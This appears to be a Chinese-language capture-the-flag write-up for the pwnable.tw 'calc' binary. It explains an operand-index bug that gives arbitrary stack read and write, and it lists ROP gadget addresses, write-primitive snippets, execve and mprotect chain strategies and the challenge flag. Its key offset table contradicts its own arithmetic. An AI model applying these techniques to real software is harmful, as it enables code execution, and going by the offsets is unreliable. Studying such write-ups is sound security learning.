---
tags:
  - integer-underflow
  - stack-buffer-overflow
  - rop
  - static-binary
platform: pwnable.tw
points: 150
arch: i386
libc: static
relro: partial
canary: yes
nx: yes
pie: no
references:
  - https://pwnable.tw/challenge/
description: "算术表达式 token 索引中的整数下溢可导致任意栈读写，从而能在返回地址处构造 ROP 链。"
proof-of-concept: no
---

# calc — pwnable.tw（150 分）

[← 返回 pwnable.tw 题目索引](README.md)

> `nc chall.pwnable.tw 10100`
>
> Flag：`FLAG{C:\Windows\System32\calc.exe}`

## 题目概览

一个静态链接的 32 位计算器二进制，求值算术表达式。用户输入形如 `1+2*3` 的表达式，程序打印结果。它支持 `+`、`-`、`*`、`/` 和 `%`。输入按行读取；空行即退出计算器。

```bash
checksec:
  Arch:     i386-32-little
  RELRO:    Partial RELRO
  Stack:    Canary found
  NX:       NX enabled
  PIE:      No PIE               # fixed base 0x08048000
  Linking:  Statically linked     # no libc.so — all gadgets in binary
```

这个二进制**没有 stripped**——可以看到 `calc`、`parse_expr`、`eval`、`get_expr`、`init_pool` 等符号。

## 架构

### `calc()` —— 计算器主循环

```asm
calc():
  sub  esp, 0x5b8
  canary = gs:0x14             // stack canary at ebp-0xc
  pool[0..0x161]               // operand pool at ebp-0x5a0 (int pool[0x162])
                               // pool[0] = count, pool[1..N] = operands
  input_buf[0x400]             // at ebp-0x40c

  loop:
    bzero(input_buf, 0x400)
    if (!get_expr(input_buf, 0x400)) return
    init_pool(pool)            // pool[0] = 0
    if (parse_expr(input_buf, pool))
      printf("%d\n", pool[pool[0]])   // print top of operand stack
```

### `parse_expr(expr, pool)` —— 表达式解析器

逐字符遍历表达式字符串。遇到数字序列时，对其调用 `atoi()`，并把值压入操作数池。遇到运算符（`+`、`-`、`*`、`/`、`%`）时，调用 `eval(pool, op)` 折叠栈顶的两个操作数。

**关键代码路径**——解析到一个数字时：

```c
num = atoi(token);
if (num > 0) {           // <-- BUG: skips push when num == 0
    pool[0]++;
    pool[pool[0]] = num;  // push operand
}
```

### `eval(pool, op)` —— 求值运算符

从池中取出栈顶的两个操作数，应用运算符，存回结果，并递减计数：

```c
// For '+':
pool[pool[0]-2] = pool[pool[0]-2] + pool[pool[0]-1];
pool[0]--;    // pop one operand
```

所有运算符的伪代码大同小异——`eval` 访问 `pool[pool[0]-2]` 和 `pool[pool[0]-1]`，把它们合并，存到 `pool[pool[0]-2]`，然后递减 `pool[0]`。

## 漏洞

### V1 —— 通过零值数字操纵操作数池索引（主要，可利用）

**根因：** 当 `atoi()` 返回 0 时（例如 token `"00"`），`parse_expr` **不会**向池中压入值，但 `eval` 仍会对 `pool[pool[0]-1]` 和 `pool[pool[0]-2]` 执行运算。这种不匹配使池索引（`pool[0]`）可以变成**负数**（或被驱到任意值），从而能读写相对池基址的任意栈偏移。

```c
// parse_expr — the zero-push bug
num = atoi(substring);
if (num > 0) {         // 0 is NOT pushed — pool[0] stays the same
    pool[0]++;
    pool[pool[0]] = num;
}
// ... then eval() is called, which does pool[0]-- regardless
```

**为什么重要：** 池位于 `calc()` 栈上的 `ebp - 0x5a0`。通过操纵 `pool[0]`，可以让 `eval` 读写的 `pool[pool[0] - 1]` 解析到任意栈地址——包括 `calc()` 的**保存返回地址**及其之后的位置。

**触发——读取栈槽：**

发送 `+N`（N 为正整数）会：
1. `atoi("N")` → 把 N 压入池 → `pool[0] = 1`，`pool[1] = N`
2. 没有更多操作数/运算符 → `printf("%d\n", pool[pool[0]])` → 打印 `pool[1]` = N

但如果用合适的表达式结构发送 `+360`，`eval` 会计算 `pool[pool[0]-2] + pool[pool[0]-1]`，而索引会落到保存的 EBP/EIP 区域。结果被打印出来——这就**泄露了栈上的值**。

**触发——写入栈槽：**

发送 `+361+<value>` 会使 eval 把 `pool[360] + <value>` 写回 `pool[360]`，而那里正是 `calc()` 的保存返回地址。先读出当前值、算出需要的增量，就能把它设成任意想要的值。

### 关键偏移

池位于 `ebp - 0x5a0`，保存的返回地址位于 `ebp + 4`：

```text
pool[0]   = ebp - 0x5a0          // operand count
pool[1]   = ebp - 0x59c          // first operand
...
pool[360] = ebp - 0x5a0 + 360*4 = ebp + 0x20  (saved EBP of calc)
pool[361] = ebp + 0x24           (saved EIP / return address of calc)
pool[362] = ebp + 0x28           (first ROP slot after return)
...
```

因此**索引 361** 就是 `calc()` 的返回地址。有些解法用 360 表示保存的 EBP，用 357 表示 canary。

### V2 —— 泄露栈 canary

canary 位于 `ebp - 0xc`，对应池索引 `(0x5a0 - 0xc) / 4 = 357`。读取 `+357` 即可泄露 canary。不过，**多数解法既不需要泄露也不需要覆盖 canary**，因为它们的 ROP 链从 pool[361] 开始（位于 canary 检查之外）——`calc()` 会检查 canary，但只要我们只从 pool[361] 起写入（即返回地址及其之后），`ebp-0xc` 处的 canary 就完好无损。

## 利用路径

所有解法都利用 V1，从 `calc()` 的返回地址开始把 ROP 链写到栈上。区别在于选用哪种系统调用方案和哪些 ROP gadget。

---

### 路径 A —— 通过 `int 0x80` ROP 链执行 `execve("/bin/sh", 0, 0)`

**使用者：** 大多数解法（约 80% 以上）

由于二进制是**静态链接**的，它包含丰富的 ROP gadget。标准做法：

1. **把 "/bin/sh" 写到某处：** 要么写在栈上（ROP 链之后的已知偏移处），要么用 `mov [edx], eax ; ret` gadget 写到可写的 `.data`/`.bss` 段。

2. **为 `execve` 系统调用设置寄存器：**
   - `eax = 0xb`（`execve` 的系统调用号）
   - `ebx` = 指向 "/bin/sh" 的指针
   - `ecx = 0`（或指向 argv 数组的指针）
   - `edx = 0`（envp）

3. **触发 `int 0x80`。**

4. **退出计算器**——发送一个空行，使 `calc()` 返回 → ROP 链开始执行。

**常用 gadget：**

```python
pop_eax     = 0x0805c34b   # pop eax ; ret
pop_edx     = 0x080701aa   # pop edx ; ret
pop_ecx_ebx = 0x080701d1   # pop ecx ; pop ebx ; ret
pop_edx_ecx_ebx = 0x080701d0  # pop edx ; pop ecx ; pop ebx ; ret
int_0x80    = 0x08049a21   # int 0x80
mov_mem_eax = 0x0809b30d   # mov dword ptr [edx], eax ; ret
xor_eax     = 0x080550d0   # xor eax, eax ; ret
inc_eax     = 0x0807cb7f   # inc eax ; ret
```

**子变体 A1 —— 把 "/bin/sh" 写到 .data，再 execve：**

用 `pop edx; ret` + `pop eax; ret` + `mov [edx], eax; ret` gadget 链把 "/bin//sh" 写到 `.data`（0x080ec060），然后设置寄存器并执行 `int 0x80`。这就是 ROPgadget `--ropchain` 的输出，也是大多数解法采用的方式。

**子变体 A2 —— 直接把 "/bin/sh" 写在栈上：**

把 "/bin/sh\0" 放在已知的栈偏移处（例如 pool[369-370]），并让 `ebx` 指向它。这需要先泄露栈地址（通过读取 pool[360] 取得保存的 EBP）。

**子变体 A3 —— 用 `inc eax` 构造系统调用号：**

不用 `pop eax; 0xb`，而是先 `xor eax, eax; ret`，再连续 11 次 `inc eax; ret`，以避免较大的立即数。

---

### 路径 B —— `mprotect` + `read` → 执行 shellcode

**使用者：** 解法 1172、1236、1351、1387、1428、10178

1. **ROP 调用 `mprotect(bss_page, 0x1000, 7)`** —— 让一个 BSS/data 页可执行。
2. **ROP 调用 `read(0, bss_addr, size)`** —— 从 stdin 读入 shellcode 到这块现已可执行的页。
3. **把执行流 pivot 到 BSS** —— 通过 `pop esp; ret` 或 `jmp bss`。
4. **发送 shellcode** 作为第二阶段 payload。

```python
# Typical layout
mprotect = 0x0806f1f0
read     = 0x0806e6d0
pppr     = 0x080701a8    # pop esi; pop ebx; pop edx; ret (to clean args)
bss      = 0x080ed000    # page-aligned BSS
```

---

### 路径 C —— 单表达式利用（不逐槽写入）

**使用者：** 解法 1155、1200、11540、10178

不逐槽发送（每个 ROP 槽一条表达式），而是构造**一条长表达式**，一次写入整条 ROP 链。这利用了 `%`（取模）或 `*`（乘法）运算符配合操作数索引操纵可以精确摆放数值的特点。

技巧：
- **`+N%00` 技巧：** `+N%00` 求值为 `pool[current_idx] % 0`，但由于 `atoi("00") = 0` 不会压栈，`eval` 就在现有池条目上运算，实际上是把索引递减。重复这一操作就会“向后走遍”整个池。
- **单行链编码：** 用 `+val1*1+val2*1+...` 这样的模式，把整条 ROP 链表示成一条算术表达式。

---

### 路径 D —— 栈 pivot 到更深处的 ROP

**使用者：** 解法 100

1. **泄露栈地址** 通过 `+360`（保存的 EBP）。
2. **把一条大 ROP 链** 写在栈的更深处（偏移 516/4 = 129 之后）。
3. **在返回地址处写入栈 pivot**（`xchg eax, esp; ret`），把执行流重定向到深处的链。

## 写原语细节

所有解法都需要把 32 位值写到指定的池索引。主要技巧：

### 技巧 1 —— 先读后增量（最常见）

```python
# Read current value at pool[idx]
sendline("+{idx}")
old = int(recvline())
# Write desired value
delta = desired - old
sendline("+{idx}+{delta}" if delta >= 0 else "+{idx}{delta}")
```

### 技巧 2 —— 先清零再赋值

```python
# Zero the slot first using division
sendline("*{idx}/{MAX_INT}")  # pool[idx] * MAX_INT / MAX_INT ≈ 0
sendline("*{idx}/{MAX_INT}")  # repeat to ensure zero
sendline("*{idx}+{value}")    # then add desired value
```

### 技巧 3 —— 直接相加（从已知的零开始时）

```python
sendline("+{idx}+{value}")    # works when pool[idx] starts at 0
```

## 利用原语总结

| 原语 | 机制 | 可靠性 |
|-----------|-----------|-------------|
| 任意栈读 | `+N` 配合构造的索引 → `printf` 输出 | 确定性 |
| 任意栈写 | 读取后 `+N+delta` / `+N-delta` | 确定性 |
| 栈 canary 泄露 | 读取 pool[357] | 确定性（通常不需要） |
| 保存的 EBP 泄露 | 读取 pool[360] | 确定性 |
| 代码执行 | pool[361+] 处的 ROP 链 → `calc` 返回到其中 | 确定性 |

## 关键 gadget（位于静态二进制中）

```python
pop_eax_ret          = 0x0805c34b
pop_ebx_ret          = 0x080481d1
pop_ecx_ebx_ret      = 0x080701d1
pop_edx_ret          = 0x080701aa
pop_edx_ecx_ebx_ret  = 0x080701d0
xor_eax_ret          = 0x080550d0
inc_eax_ret          = 0x0807cb7f
mov_edx_eax_ret      = 0x0809b30d   # mov [edx], eax; ret
int_0x80             = 0x08049a21
int_0x80_ret         = 0x08070880   # int 0x80; ret

# For shellcode path
mprotect             = 0x0806f1f0
read                 = 0x0806e6d0
pop_esi_ebx_edx_ret  = 0x080701a8
pop_esp_ret          = 0x080bc4f6

# Writable sections
data_section         = 0x080ec060
bss_section          = 0x080ed000
```

## 题解文章

| 文件 | 主要路径 | 关键技术 | 备注 |
|------|-------------|---------------|-------|
| `exp.py` | A1 | 先清零再写入，通过 int 0x80 执行 execve | 参考利用脚本 |
| `138.md` | A2 | 栈上 /bin/sh，泄露 EBP 获取地址 | Ruby；使用 xor edx 类 gadget |
| `100.md` | D | 栈 pivot，把 ROP 放在栈深处 | 先泄露栈地址 |
| `1140.md` | A1 | 通过带符号算术直接覆盖 | 写入绝对地址 |
| `1155.md` | A1 | 用增量加法的最小链 | 短小干净 |
| `1172.md` | B | mprotect + 注入 shellcode | 经典两阶段 |
| `1200.md` | C | 单条长表达式 | 用 `+val*val` 在一行内编码 |
| `1220.md` | A2 | 泄露 EBP，把 /bin/sh 放在栈上 | 先读后增量的写入 |
| `1225.md` | A1 | `*idx%val` 写原语 | ROPgadget --ropchain 输出 |
| `1236.md` | B | mprotect + read + shellcode | 标准两阶段 |
| `1259.md` | A2 | 栈上 /bin/sh，泄露 EBP | 使用 xor_ecx/xor_edx gadget |
| `1303.md` | A1 | ROPgadget 链，先读后增量的写入 | 实现干净 |
| `1351.md` | B | mprotect + read → shellcode | 极简 |
| `1387.md` | A2 | autorop + 栈泄露 | 使用 autorop 库 |
| `1428.md` | B | mprotect + 栈上 shellcode | 把 shellcode 当作整数写入 |
| `10068.md` | A2 | 泄露 EBP，栈上 /bin/sh | pop_eax + pop_dcb + int80 |
| `10115.md` | A2 | 泄露 canary + EBP，BSS 中放 /bin/sh | 通过 ROP 写入 BSS |
| `10178.md` | C | 通过 `%1` 链的单表达式 | 整条链一次发送 |
| `10302.md` | A2 | 泄露 EBP，栈上 /bin/sh | 小心处理带符号算术 |
| `11540.md` | A1 | `*val` 编码，两阶段（read） | 用乘法写入链 |
| `12245.md` | A1 | ROPgadget 链，.data 中放 /bin/sh | 带解释的中文题解 |
| `13484.md` | A2 | 在池中写 /bin/sh，计算 ebx | 干净的先读后增量方案 |
| `13757.md` | A1 | 自动生成链 | 基于 ROPgadget |
| `14605.md` | A1 | 原样使用 ROPgadget 链 | 标准做法 |

## 文件

| 文件 | 说明 |
|------|-------------|
| `exp.py` | 可用的利用脚本（先清零再写入 + execve ROP） |
| `desc.txt` | 题目描述 |
| `artifacts/calc` | 原始题目二进制（i386，静态，未 stripped） |
| `solution/*.md` | 社区题解（196 篇） |
